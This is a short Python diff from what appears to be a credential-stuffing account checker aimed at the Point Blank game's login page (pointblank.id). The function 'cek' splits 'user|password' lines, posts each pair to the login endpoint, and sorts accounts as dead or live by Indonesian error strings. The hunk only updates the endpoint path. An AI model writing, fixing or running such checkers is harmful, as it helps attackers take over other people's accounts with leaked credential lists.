@@ -16,7 +16,7 @@ from multiprocessing.pool import ThreadPool
 
 def cek(up):
 	try:
-		web=requests.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})
+		web=requests.post('https://www.pointblank.id/login/form',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})
 		if 'tidak sesuai' in web.text:
 			print '%s[ %sDIEE %s] %s'%(W0,R0,W0,up)
 		elif 'kegagalan login' in web.text:
